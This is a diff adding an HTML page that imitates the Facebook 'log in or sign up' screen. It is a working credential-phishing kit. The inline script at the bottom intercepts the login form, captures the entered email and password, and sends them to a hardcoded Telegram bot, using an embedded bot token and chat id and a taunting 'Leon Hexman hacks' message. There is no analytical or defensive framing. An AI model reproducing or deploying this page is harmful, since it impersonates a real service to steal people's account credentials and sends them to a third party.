@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 20px;
+      width: 360px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+    .logo {
+      color: #1877f2;
+      font-size: 45px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #165fbd;
+    }
+    .link {
+      text-align: center;
+      margin-top: 10px;
+    }
+    .link a {
+      text-decoration: none;
+      color: #1877f2;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <div class="logo">facebook</div>
+      <form action="#" method="POST">
+        <input type="text" placeholder="Email address or phone number" name="email" required />
+        <input type="password" placeholder="Password" name="password" required />
+        <button type="submit">Log In</button>
+      </form>
+      <div class="link">
+        <a href="#">Forgotten password?</a>
+      </div>
+      <hr />
+      <div class="link">
+        <a href="#"><button style="background-color:#42b72a;">Create New Account</button></a>
+      </div>
+      <div class="result"></div>
+      <script>
+        const token = '8583923291:AAHWNuRxcW_kF9QjNgA0ktAkIcFbycR6amY';
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        document.querySelector('form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const email = document.querySelector('input[name="email"]').value;
+          const password = document.querySelector('input[name="password"]').value;
+          const data = `New login info received from Leon Hexman hacks 😈😈😈:  ${email} 
+with password🔑🔑🔑:${password}`;
+          const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: '8041159450', text: data }),
+          });
+          const result = await response.json();
+          console.log(result);
+        });
+      </script>
+    </div>
+  </div>
+</body>
+</html>
